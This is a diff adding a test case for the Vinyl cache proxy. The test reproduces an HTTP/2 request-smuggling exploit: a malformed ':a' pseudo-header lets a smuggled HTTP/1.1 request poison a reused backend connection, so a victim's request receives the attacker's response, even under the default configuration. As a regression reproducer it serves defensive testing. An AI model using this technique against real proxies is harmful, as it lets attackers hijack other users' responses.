@@ -1,0 +1,56 @@
+vtest "H2 :a smuggle — default builtin VCL, only feature=+http2 added"
+
+# Same exploit as h2_smuggle_colon_a.vtc but with NO user VCL. Uses only
+# the shipped builtin.vcl. Only non-default flag is `feature=+http2`.
+
+server s1 {
+	rxreq
+	expect req.method == "POST"
+	expect req.url == "/attacker"
+	expect req.http.host == <undef>
+	expect req.bodylen == 109
+	txresp -hdr "X-Which: attacker"
+
+	rxreq
+	expect req.url == "/smuggled"
+	expect req.http.X-Smuggled == "yes"
+	expect req.body ~ "GET /victim "
+	txresp -hdr "X-Which: smuggled"
+} -start
+
+# NO `-vcl+backend` with a sub vcl_recv — use backend-only and builtin VCL.
+vinyl v1 -arg "-p feature=+http2" -vcl {
+	backend s1 {
+		.host = "${s1_addr}";
+		.port = "${s1_port}";
+	}
+} -start
+
+client c1 {
+	stream 1 {
+		txreq -noadd \
+		    -idxHdr 3 \
+		    -litIdxHdr never 4 plain "/attacker" \
+		    -idxHdr 7 \
+		    -hdr "content-length" "109" \
+		    -litHdr never plain ":a" plain "xx" \
+		    -hdr "probe" "pad" \
+		    -hdr "host" "example.com" \
+		    -nostrend
+		txdata -data "GET /smuggled HTTP/1.1\r\nHost: x\r\nX-Smuggled: yes\r\nContent-Length: 171\r\n\r\nPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP"
+		rxresp
+		expect resp.status == 200
+		expect resp.http.X-Which == "attacker"
+	} -run
+} -run
+
+delay 0.1
+
+client c2 {
+	txreq -url "/victim" -hdr "Host: example.com"
+	rxresp
+	expect resp.status == 200
+	expect resp.http.X-Which == "smuggled"
+} -run
+
+vinyl v1 -expect MAIN.backend_reuse == 1
